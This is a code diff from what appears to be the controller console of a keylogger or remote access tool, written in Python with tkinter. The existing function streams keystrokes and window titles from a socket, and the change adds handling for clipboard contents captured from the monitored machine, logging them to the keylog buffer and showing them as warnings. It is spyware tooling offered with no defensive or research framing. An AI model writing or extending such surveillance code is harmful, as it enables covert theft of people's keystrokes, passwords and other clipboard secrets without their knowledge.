@@ -543,6 +543,15 @@ def start_keylog_stream():
                             _keylog_buffer.append(f"\n--- [{ts}] 🪟 {title} ---")
                             g.root.after(0, lambda t=title: g.terminal_output.insert(tk.END, f"\n🪟 [{t}]\n", "output"))
                             g.root.after(0, lambda: g.terminal_output.see(tk.END))
+                    elif line.startswith("[CLIPBOARD]"):
+                        ts_clip = line[len("[CLIPBOARD]"):].strip()
+                        parts = ts_clip.split(" ", 1)
+                        if len(parts) == 2:
+                            ts = parts[0]
+                            content = parts[1]
+                            _keylog_buffer.append(f"\n--- [{ts}] 📋 Clipboard: {content} ---")
+                            g.root.after(0, lambda c=content: g.terminal_output.insert(tk.END, f"📋 [Clipboard: {c}]\n", "warning"))
+                            g.root.after(0, lambda: g.terminal_output.see(tk.END))
             except socket.timeout:
                 continue
             except (OSError, ConnectionError):
